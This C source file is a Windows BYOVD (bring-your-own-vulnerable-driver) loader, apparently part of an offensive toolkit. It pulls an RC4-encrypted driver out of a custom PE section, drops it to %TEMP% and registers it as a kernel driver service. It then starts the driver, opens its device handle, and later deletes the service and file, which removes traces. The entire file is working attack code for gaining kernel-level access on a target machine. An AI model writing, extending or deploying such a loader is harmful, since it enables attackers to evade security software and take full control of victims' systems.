/*
 * BYOVD Loader
 *
 * Extracts the driver embedded in the .jdrv PE section by packer.cpp,
 * decrypts it, drops it to %TEMP%, registers it as a kernel driver
 * service, starts it, and opens a handle to its device object.
 * Windows only.
 *
 * .jdrv section layout (matches packer.cpp embedDriver):
 *   [0..7]   magic    "JOCKYDRV"
 *   [8..11]  origSize uint32_t  (plaintext driver size)
 *   [12..27] key      16-byte RC4 key
 *   [28..]   data     RC4-encrypted driver bytes
 */

#ifdef _WIN32

#include "jocky_rt.h"
#include <windows.h>
#include <winsvc.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <stdint.h>

extern bool jocky_extract_embedded_driver(const char* name, char* out_path, size_t path_len);

/* ── Fast LCG-based random hex string (no CRT rand dependency) ───────── */

static void rand_hex8(char out[9])
{
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    uint64_t seed = ((uint64_t)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
    seed ^= (uint64_t)GetCurrentProcessId() * 0x9e3779b97f4a7c15ULL;
    for (int i = 0; i < 8; i++) {
        seed = seed * 6364136223846793005ULL + 1442695040888963407ULL;
        out[i] = "0123456789abcdef"[(seed >> 33) & 0xF];
    }
    out[8] = '\0';
}

/* ── Public API ──────────────────────────────────────────────────────── */

static void blog(const char* fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    fflush(stdout);
}

bool jocky_byovd_load(const char*    service_name,
                      const char*    device_name,
                      jocky_byovd_t* out)
{
    blog("[BYOVD] Trying driver: %s\n", service_name ? service_name : "(null)");
    if (!out) { blog("[BYOVD] ctx is NULL\n"); return false; }
    memset(out, 0, sizeof(*out));
    out->device = INVALID_HANDLE_VALUE;

    /* Extract embedded driver bytes to a temp file. */
    char tmp_path[MAX_PATH];
    if (!jocky_extract_embedded_driver(service_name, tmp_path, MAX_PATH)) {
        blog("[BYOVD] extract failed for %s\n", service_name);
        return false;
    }
    blog("[BYOVD] Extracted to: %s\n", tmp_path);

    strncpy(out->driver_path, tmp_path, MAX_PATH - 1);

    wchar_t wide_path[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, tmp_path, -1, wide_path, MAX_PATH);

    if (service_name && service_name[0]) {
        strncpy(out->service_name, service_name, 63);
        char* dot = strrchr(out->service_name, '.');
        if (dot) *dot = '\0';
    } else {
        strncpy(out->service_name, "jky_drv", 63);
    }

    wchar_t wide_svc[64];
    MultiByteToWideChar(CP_ACP, 0, out->service_name, -1, wide_svc, 64);

    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        blog("[BYOVD] OpenSCManager failed: %lu\n", GetLastError());
        DeleteFileA(tmp_path);
        return false;
    }

    SC_HANDLE hExist = OpenServiceW(hSCM, wide_svc, SERVICE_STOP | DELETE);
    if (hExist) {
        SERVICE_STATUS ss;
        ControlService(hExist, SERVICE_CONTROL_STOP, &ss);
        Sleep(300);
        DeleteService(hExist);
        CloseServiceHandle(hExist);
    }

    SC_HANDLE hSvc = CreateServiceW(
        hSCM, wide_svc, wide_svc,
        SERVICE_START | SERVICE_STOP | DELETE,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        wide_path,
        NULL, NULL, NULL, NULL, NULL);

    if (!hSvc) {
        blog("[BYOVD] CreateService failed: %lu\n", GetLastError());
        CloseServiceHandle(hSCM);
        DeleteFileA(tmp_path);
        return false;
    }

    if (!StartServiceW(hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        blog("[BYOVD] StartService failed: %lu\n", err);
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            DeleteService(hSvc);
            CloseServiceHandle(hSvc);
            CloseServiceHandle(hSCM);
            DeleteFileA(tmp_path);
            return false;
        }
    } else {
        blog("[BYOVD] Service started OK\n");
    }

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    /* device_name from the chain already includes \\.\  prefix — use as-is.
     * Only prepend \\.\  if the name doesn't start with a backslash. */
    char dev_path[MAX_PATH];
    const char* dname = (device_name && device_name[0]) ? device_name : out->service_name;
    if (dname[0] == '\\')
        strncpy(dev_path, dname, MAX_PATH - 1);
    else
        _snprintf(dev_path, MAX_PATH, "\\\\.\\%s", dname);

    blog("[BYOVD] Opening device: %s\n", dev_path);
    out->device = CreateFileA(dev_path, GENERIC_READ | GENERIC_WRITE,
                              0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (out->device == INVALID_HANDLE_VALUE) {
        blog("[BYOVD] Device open FAILED (err=%lu) — unloading\n", GetLastError());
        jocky_byovd_unload(out);
        return false;
    }
    blog("[BYOVD] Device handle OK\n");
    return true;
}

void jocky_byovd_unload(jocky_byovd_t* ctx)
{
    if (!ctx) return;

    /* Close the device handle first. */
    if (ctx->device != INVALID_HANDLE_VALUE && ctx->device) {
        CloseHandle(ctx->device);
        ctx->device = INVALID_HANDLE_VALUE;
    }

    /* Stop and delete the SCM service. */
    if (ctx->service_name[0]) {
        SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
        if (hSCM) {
            SC_HANDLE hSvc = OpenServiceA(hSCM, ctx->service_name,
                                          SERVICE_STOP | DELETE);
            if (hSvc) {
                SERVICE_STATUS ss;
                ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
                Sleep(500); /* give the driver time to unload */
                DeleteService(hSvc);
                CloseServiceHandle(hSvc);
            }
            CloseServiceHandle(hSCM);
        }
        ctx->service_name[0] = '\0';
    }

    /* Delete the dropped .sys from disk. */
    if (ctx->driver_path[0]) {
        DeleteFileA(ctx->driver_path);
        ctx->driver_path[0] = '\0';
    }
}

#endif /* _WIN32 */
